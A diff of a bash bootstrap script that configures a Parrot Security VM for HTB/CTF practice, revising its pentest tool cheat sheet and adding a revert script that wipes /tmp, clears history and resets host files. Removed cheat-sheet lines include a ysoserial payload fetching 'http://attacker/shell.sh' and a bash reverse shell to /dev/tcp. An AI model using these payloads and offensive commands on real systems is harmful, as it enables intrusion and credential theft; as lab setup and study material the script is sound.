@@ -2,6 +2,7 @@
 
 # Parrot Security VM Enhancement Bootstrap Script
 # For fresh Parrot installs running as VM guest on Windows host
+# Version 2.2 (Final - HTB/CTF Focused with Archive & Revert)
 
 set -e
 
@@ -171,7 +172,6 @@ phase4_tools_setup() {
     
     # Modern Python pentesting tools with pipx
     log_progress "Installing NetExec (modern CrackMapExec replacement)..."
-    # NetExec (modern CrackMapExec replacement)
     sudo -u jamie pipx install git+https://github.com/Pennyw0rth/NetExec || log_warn "NetExec failed to install"
     
     # Core HTB/CTF tools (APT)
@@ -271,7 +271,7 @@ YSOSERIAL_EOF
     
     # Clone essential repos
     log_progress "Cloning essential pentesting repositories..."
-    # (All repo clones remain here as they were perfect)
+    
     if [ ! -d "$USER_HOME/tools/repos/PayloadsAllTheThings" ]; then
         sudo -u jamie git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git $USER_HOME/tools/repos/PayloadsAllTheThings
     fi
@@ -443,7 +443,7 @@ quickscan() {
     nmap -sV -sC -O -oA quickscan_$(date +%Y%m%d_%H%M%S) $1
 }
 
-# FIXED: Enhanced extract function to handle more compression types
+# Enhanced extract function to handle more compression types
 extract() {
     if [ -f $1 ]; then
         case $1 in
@@ -712,10 +712,6 @@ Impacket Suite (Aliases installed: 'secretsdump', 'psexec', 'getnpusers', etc.)
     Remote command execution
     Usage: psexec <domain>/<user>:<pass>@<target>
    
-  getTGT.py / getST.py
-    Kerberos ticket manipulation
-    Usage: getTGT.py <domain>/<user>:<pass>
-   
   ticketer
     Forge Kerberos tickets (Golden/Silver ticket attacks)
     Usage: ticketer -nthash <hash> -domain-sid <sid> -domain <domain> <user>
@@ -761,7 +757,6 @@ mitm6
 mitmproxy / mitmweb
   Interactive HTTPS proxy for web app testing
   Usage: mitmproxy (TUI) or mitmweb (Web UI on :8081)
-  Note: More powerful than Burp for scripting/automation
 
 ═══════════════════════════════════════════════════════════════════════════
 PIVOTING & TUNNELING
@@ -791,7 +786,6 @@ proxychains4
   Route traffic through SOCKS/HTTP proxies
   Usage: proxychains4 nmap <target>
   Config: /etc/proxychains4.conf
-  MSF: set Proxies socks5:127.0.0.1:1080 (native, no proxychains needed)
 
 xfreerdp
   RDP client for connecting to Windows systems
@@ -805,74 +799,34 @@ git-dumper
   Dump exposed .git repositories
   Usage: git-dumper http://target/.git/ output_dir/
 
-GIT REPOSITORY ANALYSIS
-
-GitTools
-  Suite for finding and exploiting exposed .git directories
-  Location: ~/tools/repos/GitTools/
-   
-  Finder: Find websites with exposed .git
-    python3 GitTools/Finder/gitfinder.py -i targets.txt
-   
-  Dumper: Download exposed .git repository
-    bash GitTools/Dumper/gitdumper.sh http://target/.git/ output_dir/
-   
-  Extractor: Extract commits from downloaded .git
-    bash GitTools/Extractor/extractor.sh output_dir/ extracted/
-
 truffleHog
   Find secrets and credentials in git history
   Usage: trufflehog git file:///path/to/repo
   Remote: trufflehog git https://github.com/user/repo
-  Docker: trufflehog docker --image repo:tag
 
 gitleaks
   Fast secret detector for git repositories
   Usage: gitleaks detect --source /path/to/repo
-  Scan file: gitleaks detect -f config.yaml
-  Protect: gitleaks protect (pre-commit hook)
-
-gitrob
-  GitHub organization reconnaissance
-  Usage: gitrob <github-org>
-  Note: Requires GitHub API token
 
 wpscan
   WordPress vulnerability scanner
   Usage: wpscan --url http://target.com/ -e vp,vt,u --api-token <token>
 
-COMMON GIT SECRET PATTERNS
-  - AWS Keys: AKIA[0-9A-Z]{16}
-  - Private Keys: -----BEGIN.*PRIVATE KEY-----
-  - Database URLs: mysql://.*:.*@.*
-  - API Keys: api[_-]?key.*['\"][0-9a-zA-Z]{32,}['\"]
-
-═══════════════════════════════════════════════════════════════════════════
-WEB APPLICATION TESTING
-═══════════════════════════════════════════════════════════════════════════
-
 SQL INJECTION
 sqlmap
   Automated SQL injection exploitation
   Usage: sqlmap -u <url> --batch --dump
-  POST data: sqlmap -u <url> --data="param=value" --batch
-  Tamper scripts: sqlmap -u <url> --tamper=space2comment
-  Database dump: sqlmap -u <url> -D <db> -T <table> --dump
 
 DESERIALIZATION ATTACKS
 ysoserial
   Java deserialization payload generator
   Location: ~/tools/ysoserial.jar
   Usage: ysoserial <payload> <command>
-  Example: ysoserial CommonsCollections6 "wget http://attacker/shell.sh"
-  List payloads: ysoserial --help
-  Common payloads: CommonsCollections1-7, Spring1-2, URLDNS
 
 REVERSE SHELLS
 penelope
   Feature-rich reverse shell handler
   Usage: penelope 4444
-  Note: Auto-upgrades shells, handles PTY, session management
 
 rlwrap / socat / nc-openbsd
   Manual shell handling and connection tools
@@ -885,25 +839,15 @@ PASSWORD CRACKING
 
 hashcat
   GPU-accelerated password cracking
-  NTLM: hashcat -m 1000 hashes.txt rockyou.txt
-  NTLMv2: hashcat -m 5600 hashes.txt rockyou.txt
-  bcrypt: hashcat -m 3200 hashes.txt rockyou.txt
-  SHA256: hashcat -m 1400 hashes.txt rockyou.txt
-  Modes: hashcat --help | grep -i <hash-type>
-  Show cracked: hashcat -m <mode> hashes.txt --show
+  Usage: hashcat -m 1000 hashes.txt rockyou.txt
 
 john
   CPU password cracking (John the Ripper)
-  Basic: john --wordlist=rockyou.txt hashes.txt
-  Format: john --format=NT hashes.txt --wordlist=rockyou.txt
-  Show: john --show hashes.txt
-  Incremental: john --incremental hashes.txt
+  Usage: john --wordlist=rockyou.txt hashes.txt
 
 CeWL
   Generate custom wordlists from websites
   Usage: cewl -d 2 -m 5 -w wordlist.txt <url>
-  With emails: cewl -d 2 -m 5 -e -w wordlist.txt <url>
-  Authentication: cewl -d 2 -m 5 -w wordlist.txt <url> -a
 
 ═══════════════════════════════════════════════════════════════════════════
 BINARY EXPLOITATION
@@ -912,20 +856,14 @@ BINARY EXPLOITATION
 pwntools
   Python exploit development library
   Usage: from pwn import *
-  Example: r = remote('target', 1337)
-  Common: p64(), p32(), cyclic(), asm(), shellcraft
 
 pwndbg
   Enhanced GDB with pwntools integration
-  Usage: gdb ./binary (pwndbg loads automatically)
-  Commands: checksec, cyclic, vmmap, telescope, heap
-  Breakpoints: break main, run, continue, step
+  Usage: gdb ./binary
 
 ROPgadget
   ROP chain builder
   Usage: ROPgadget --binary ./binary
-  Find gadgets: ROPgadget --binary ./binary --only "pop|ret"
-  ROP chain: ROPgadget --binary ./binary --ropchain
 
 one_gadget
   Find the "one gadget" RCE offsets in libc
@@ -938,7 +876,6 @@ CTF / FORENSICS / STEGANOGRAPHY
 binwalk
   Firmware/File analysis and extraction tool
   Usage: binwalk -e <file>   # Extract embedded files
-  Scan: binwalk -P <file>   # Entropy scan
 
 exiftool
   Read and write meta information in files
@@ -967,75 +904,12 @@ PRIVILEGE ESCALATION
 LINUX
 linpeas.sh
   Automated Linux privilege escalation scanner
-  Location: ~/linpeas.sh (symlink to ~/tools/repos/PEASS-ng/linPEAS/linpeas.sh)
   Usage: ./linpeas.sh | tee linpeas_output.txt
 
 WINDOWS
 winpeas.exe
   Automated Windows privilege escalation scanner
-  Location: ~/winpeas.exe (symlink to ~/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe)
   Transfer to target and run: winpeas.exe
-
-Windows-Exploit-Suggester
-  Finds missing patches on Windows systems
-  Location: ~/tools/repos/Windows-Exploit-Suggester/
-  Usage: python windows-exploit-suggester.py --update
-         python windows-exploit-suggester.py --database <db> --systeminfo <file>
-
-═══════════════════════════════════════════════════════════════════════════
-REPOSITORIES & RESOURCES
-═══════════════════════════════════════════════════════════════════════════
-
-PayloadsAllTheThings/
-  Swiss Army knife for pentesting
-  Browse locally: ~/tools/repos/PayloadsAllTheThings/
-
-PowerSploit/
-  PowerShell post-exploitation framework
-  Location: ~/tools/repos/PowerSploit/
-
-HackTricks/
-  Carlos Polop's methodology and technique documentation
-  Browse locally or at: https://book.hacktricks.xyz
-
-GTFOBins/
-  Unix binaries that can be used for privilege escalation
-  Browse: ~/tools/repos/GTFOBins/_gtfobins/ directory
-
-LOLBAS/
-  Living Off The Land Binaries and Scripts for Windows
-  Browse: ~/tools/repos/LOLBAS/yml/ directory for techniques
-
-═══════════════════════════════════════════════════════════════════════════
-WORDLISTS
-═══════════════════════════════════════════════════════════════════════════
-
-SecLists/
-  Comprehensive collection of security wordlists
-  Location: ~/SecLists (symlink to ~/tools/wordlists/SecLists/)
-  Popular lists: Passwords, Web Content, Usernames, Fuzzing
-
-rockyou.txt
-  Classic password list (14M+ passwords)
-  Location: ~/tools/wordlists/rockyou.txt (symlink to /usr/share/wordlists/rockyou.txt)
-
-═══════════════════════════════════════════════════════════════════════════
-MODERN WORKFLOW TIPS
-═══════════════════════════════════════════════════════════════════════════
-
-Initial Recon Chain:
-  subfinder -d target.com -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
-
-Reverse Shell Listener:
-  rlwrap nc -lvnp 4444
-
-Git Repository Disclosure:
-  1. Dump: git-dumper or GitTools/Dumper
-  2. Extract: GitTools/Extractor (recovers all commits)
-  3. Scan secrets: trufflehog + gitleaks on extracted repo
-
-Java Deserialization:
-  1. Payload: ysoserial CommonsCollections6 "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
 
 ═══════════════════════════════════════════════════════════════════════════
 TIPS & TRICKS
@@ -1043,37 +917,19 @@ TIPS & TRICKS
 
 • All Impacket tools now work WITHOUT the '.py' suffix! (e.g., 'secretsdump')
 • Use 'nxc' as shorthand for 'netexec'
-• Tmux prefix is Ctrl-a (split with | and -)
-• Alt+arrows to switch tmux panes without prefix
 • Use **'extract'** function for any compressed file (including 7z)
 • Use **'rl'** for a reliable netcat listener with history (rlwrap nc)
-
-═══════════════════════════════════════════════════════════════════════════
-ENGAGEMENT WORKFLOW
-═══════════════════════════════════════════════════════════════════════════
-
-1. newengagement <target-name>
-2. cd ~/engagements/<target-name>
-3. Initial recon:
-   - subfinder -d target.com -silent | tee recon/subdomains.txt
-   - naabu -l recon/subdomains.txt -silent | tee recon/ports.txt
-4. Web enumeration:
-   - httpx -l recon/subdomains.txt -tech-detect | tee recon/web.txt
-   - nuclei -l recon/web.txt -severity critical,high
-5. Document findings in notes/
-6. Store loot in loot/
-7. Keep all output files in recon/scans/ for reference
+• **REVERT_CTF_CHANGES.sh** on the Desktop archives engagements and resets the environment.
 
 ═══════════════════════════════════════════════════════════════════════════
 
-Tool Stack Version: 2.1 (Impacket/Compression Fix Edition)
+Tool Stack Version: 2.2 (Final - HTB/CTF Focused with Archive & Revert)
 Last updated: ${CREATION_DATE}
 
 TOOLS_EOF
 
     # Create VirtualBox Guest Additions installation guide
     log_info "Creating VirtualBox Guest Additions installation guide"
-    # (Content of VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt remains the same)
     cat > $USER_HOME/Desktop/VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt << 'VBOX_EOF'
 ╔═══════════════════════════════════════════════════════════════════════════╗
 ║          Installing VirtualBox Guest Additions on Parrot OS               ║
@@ -1334,6 +1190,144 @@ EOF
     
     chmod +x $USER_HOME/scripts/update-tools.sh
     
+    # --- NEW REVERT & ARCHIVE SCRIPT ---
+    log_progress "Creating CTF environment revert and archive script..."
+    cat > $USER_HOME/scripts/revert-ctf-changes.sh << 'REVERT_EOF'
+#!/bin/bash
+# CTF Environment Revert & Archive Script
+# Archives engagement data and cleans up common artifacts left over from HTB/CTF engagements.
+
+set -e
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+log_revert_info() { 
+    echo -e "${GREEN}[*]${NC} $1"
+}
+log_revert_warn() { 
+    echo -e "${YELLOW}[!]${NC} $1"
+}
+
+# 1. Reset Host & DNS Files
+reset_network_config() {
+    log_revert_info "1. Resetting /etc/hosts, /etc/resolv.conf, and Kerberos config..."
+    
+    # a) Reset /etc/hosts to default loopback entries
+    if [ -w /etc/hosts ]; then
+        echo -e "127.0.0.1\tlocalhost\n127.0.1.1\tparrot" | sudo tee /etc/hosts > /dev/null
+        log_revert_info " -> /etc/hosts reverted."
+    else
+        log_revert_warn " -> Cannot write to /etc/hosts. Skipping."
+    fi
+    
+    # b) Reset /etc/resolv.conf to standard Google/Cloudflare DNS
+    if [ -w /etc/resolv.conf ]; then
+        echo -e "nameserver 127.0.0.1\nnameserver 8.8.8.8\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf > /dev/null
+        log_revert_info " -> /etc/resolv.conf reset."
+    else
+        log_revert_warn " -> Cannot write to /etc/resolv.conf. Skipping."
+    fi
+    
+    # c) Clear Kerberos configuration
+    if [ -f /etc/krb5.conf.default ]; then
+        sudo cp /etc/krb5.conf.default /etc/krb5.conf
+        log_revert_info " -> /etc/krb5.conf reverted."
+    else
+        log_revert_warn " -> Default Kerberos config not found. Skipping /etc/krb5.conf."
+    fi
+}
+
+# 2. Clear Residual Credentials and Tickets
+clear_credentials() {
+    log_revert_info "2. Clearing residual session data..."
+    
+    # a) Clear Kerberos ticket cache
+    if klist &>/dev/null; then
+        kdestroy -A 2>/dev/null
+        log_revert_info " -> Kerberos tickets destroyed."
+    fi
+    
+    # b) Clear user-specific temp folders where tokens might be stored
+    find $HOME/ -type f -name "*.token" -delete 2>/dev/null
+    log_revert_info " -> Temporary token files deleted from home directory."
+    
+    # c) Clear ssh-agent identities
+    if ssh-add -l &>/dev/null; then
+        ssh-add -D 2>/dev/null
+        log_revert_info " -> SSH identities cleared from ssh-agent."
+    fi
+}
+
+# 3. Archive engagement-specific data and clean up workspace
+cleanup_workspace() {
+    log_revert_info "3. Archiving engagement data and cleaning workspace..."
+    
+    local ENGAGEMENTS_DIR="$HOME/engagements"
+    local BACKUP_DIR="$HOME/backups"
+    local TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+    local ARCHIVE_NAME="engagement_archive_${TIMESTAMP}.tar.gz"
+
+    mkdir -p $BACKUP_DIR
+    
+    # a) Archive and move engagements directory
+    if [ -d "$ENGAGEMENTS_DIR" ] && [ "$(ls -A $ENGAGEMENTS_DIR)" ]; then
+        echo ""
+        log_revert_warn "!!! WARNING: About to zip and move the contents of $ENGAGEMENTS_DIR"
+        read -r -p "Do you want to archive and clear the engagement data? (yes/no): " confirmation
+        if [[ "$confirmation" =~ ^(yes|y)$ ]]; then
+            # Create archive
+            tar -czf $BACKUP_DIR/$ARCHIVE_NAME -C $ENGAGEMENTS_DIR .
+            log_revert_info " -> Engagements successfully archived to $BACKUP_DIR/$ARCHIVE_NAME"
+            
+            # Clear the live engagements directory
+            rm -rf $ENGAGEMENTS_DIR/*
+            log_revert_info " -> $ENGAGEMENTS_DIR cleared for the next CTF."
+        else
+            log_revert_warn " -> Engagement data preserved. $ENGAGEMENTS_DIR NOT cleared."
+        fi
+    else
+        log_revert_info " -> $ENGAGEMENTS_DIR is empty or not found. Skipping archive."
+    fi
+    
+    # b) Clear common temporary directories
+    log_revert_info " -> Clearing common temporary directories (e.g., /tmp, /dev/shm)..."
+    sudo rm -rf /tmp/* /dev/shm/* $HOME/.cache/* 2>/dev/null || true
+}
+
+# 4. Final System Polish
+final_polish() {
+    log_revert_info "4. Final System Polish..."
+    
+    # Clear Zsh history
+    history -c
+    history -w
+    log_revert_info " -> Shell history cleared for current session."
+    
+    log_revert_info "Script finished! A reboot is recommended for a clean state."
+}
+
+# --- Main Execution ---
+echo -e "${RED}╔═══════════════════════════════════════════════════╗${NC}"
+echo -e "${RED}║               CTF ENVIRONMENT REVERT & ARCHIVE        ║${NC}"
+echo -e "${RED}╚═══════════════════════════════════════════════════╝${NC}"
+log_revert_warn "This script requires 'sudo' privileges for network changes."
+read -r -p "Press Enter to begin the revert process (Ctrl+C to cancel)..."
+
+reset_network_config
+clear_credentials
+cleanup_workspace
+final_polish
+
+REVERT_EOF
+    
+    chmod +x $USER_HOME/scripts/revert-ctf-changes.sh
+    sudo -u jamie ln -sf $USER_HOME/scripts/revert-ctf-changes.sh $USER_HOME/Desktop/REVERT_CTF_CHANGES.sh 2>/dev/null || true
+    log_info "Revert/Archive script created: ~/scripts/revert-ctf-changes.sh"
+    log_info "Desktop symlink created: ~/Desktop/REVERT_CTF_CHANGES.sh"
+
     # Quick backup script
     cat > $USER_HOME/scripts/backup-engagement.sh << 'EOF'
 #!/bin/bash
@@ -1355,6 +1349,7 @@ EOF
     
     chmod +x $USER_HOME/scripts/backup-engagement.sh
     chown -R jamie:jamie $USER_HOME/scripts
+    chown jamie:jamie $USER_HOME/Desktop/REVERT_CTF_CHANGES.sh
     
     log_info "Phase 6 complete"
     log_progress "Phase 6/8: ✓ Complete"
@@ -1486,13 +1481,14 @@ Next steps:
 5. Create an engagement: newengagement <name>
 
 Useful commands:
-  - newengagement <name>  : Create new engagement folder
-  - quickscan <target>    : Quick nmap scan
-  - serve                 : Start HTTP server on port 8000
-  - update-tools.sh       : Update all tools
-  - reconchain <domain>   : Quick recon with ProjectDiscovery tools
-  - gitanalyze <url>      : Complete Git repository analysis
-  - extract <file>        : Universal archive extraction (Fixed!)
+  - newengagement <name>     : Create new engagement folder
+  - quickscan <target>       : Quick nmap scan
+  - serve                   : Start HTTP server on port 8000
+  - update-tools.sh         : Update all tools
+  - reconchain <domain>     : Quick recon with ProjectDiscovery tools
+  - gitanalyze <url>        : Complete Git repository analysis
+  - extract <file>          : Universal archive extraction (Fixed!)
+  - **REVERT_CTF_CHANGES.sh**: Archives engagement data and resets host files.
 
 Tool reference guide on Desktop: CTF_TOOLS_REFERENCE.txt
 VirtualBox setup guide on Desktop: VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt
